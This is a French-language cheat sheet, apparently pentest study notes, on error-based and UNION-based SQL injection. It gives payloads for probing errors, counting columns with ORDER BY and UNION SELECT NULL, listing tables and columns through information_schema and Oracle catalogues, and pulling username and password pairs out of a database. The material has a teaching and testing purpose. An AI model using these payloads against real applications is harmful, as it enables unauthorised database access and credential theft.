Ce type d'injection SQL est le plus utile pour obtenir facilement des informations sur la structure de la base de données car les messages d'erreur de la base de données sont imprimés directement sur l'écran du navigateur.

[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Découverte SQLi 

La clé pour découvrir l'injection SQL basée sur les erreurs est de: 

- Casser la requête SQL en essayant certains caractères jusqu'à ce qu'un message d'erreur soit produit ; il s'agit le plus souvent des caractères comme:

```sh
' -> %27
" -> %22
# -> %23
; -> %3B
) -> %29
```

> Le fait de recevoir un message d'erreur confirme l'existence d'une vulnérabilité SQL Injection

## Injection sur UNION

Ce type d'injection utilise l'opérateur SQL UNION avec une instruction SELECT pour renvoyer des résultats supplémentaires à la page.

**1 - Renvoyer les données au navigateur sans afficher de message d'erreur.**

```sql
?id=0 UNION SELECT 1
```

Cette instruction produit un message d'erreur vous informant que `l'instruction UNION SELECT a un nombre de colonnes différent de celui de la requête SELECT d'origine.`

Essayons mais ajoutons une autre colonne jusqu'a le message d'erreur disparais:

```sql
?id=1 UNION SELECT 1,2,...
```

**2 - Afficher nos données**

Cela peut simplement être fait en changeant l'identifiant de l'article de `1 à 0`

```sql
?id=0 UNION SELECT 1,2,...
```

Maintenant l'article est simplement composé du résultat de la sélection UNION

**3 - Récupérer des informations plus utiles.**

On peut remplacer 1 par `null`

```sql
-- Obtenir le nom de la base de données:
0 UNION SELECT 1,2,database()

-- Affiche la version du serveur
0 UNION SELECT null, version()
```

Lister des tables qui se trouvent dans cette base de données:

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '{db_name}'

-- ou 

0 UNION SELECT null,table_name FROM INFORMATION_SCHEMA.tables

-- ou sur Oracle

0 UNION SELECT null,table_name FROM all_tables
```

Trouver la structure des tables (colones):

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = '{db_table_name}'

-- ou 

0 UNION SELECT null,column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='{db_table_name}'

-- ou sur Oracle

0 UNION SELECT null,column_name FROM all_tab_columns WHERE table_name='{db_table_name}'
```

Récupérer les informations:

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM {db_table_name}

-- ou 

0 UNION SELECT null, concat(user,0x0a,password) FROM {db_table_name}

-- ou sur Oracle et Postgres
0 UNION SELECT username || '~' || password FROM {db_table_name}--

```


### Comment déterminer le nombre de colonnes requises de la requête d'origine ?

Lorsque vous effectuez une attaque UNION par injection SQL, il existe deux méthodes efficaces pour déterminer le nombre de colonnes renvoyées par la requête d'origine.

- Une méthode consiste à injecter une série de clauses `ORDER BY` et à incrémenter l'index de colonne spécifié jusqu'à ce qu'une erreur se produise.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

etc...
```

- La deuxième méthode consiste à soumettre une série de charges utiles `UNION SELEC` spécifiant un nombre différent de valeurs nulles :

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

etc...

' UNION SELECT NULL FROM DUAL--
```

- Après avoir déterminé le nombre de colonnes requises, vous pouvez tester chaque colonne pour vérifier si elle peut contenir des données de `type chaîne`.

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

-- Si le type de données de la colonne n'est pas compatible avec les données de chaîne, la requête injectée provoquera une erreur de base de données (Conversion failed when converting the varchar value 'a' to data type int.)

-- Si aucune erreur ne se produit et que la réponse de l'application contient du contenu supplémentaire, notamment la valeur de chaîne injectée, la colonne correspondante est alors adaptée à la récupération des données de chaîne.
```

- Lorsque vous avez déterminé le nombre de colonnes renvoyées par la requête d'origine et trouvé quelles colonnes peuvent contenir des données de chaîne, vous êtes en mesure de récupérer des données intéressantes.

- Récupération de plusieurs valeurs dans une seule colonne

```sql
' UNION SELECT username || '~' || password FROM users--
```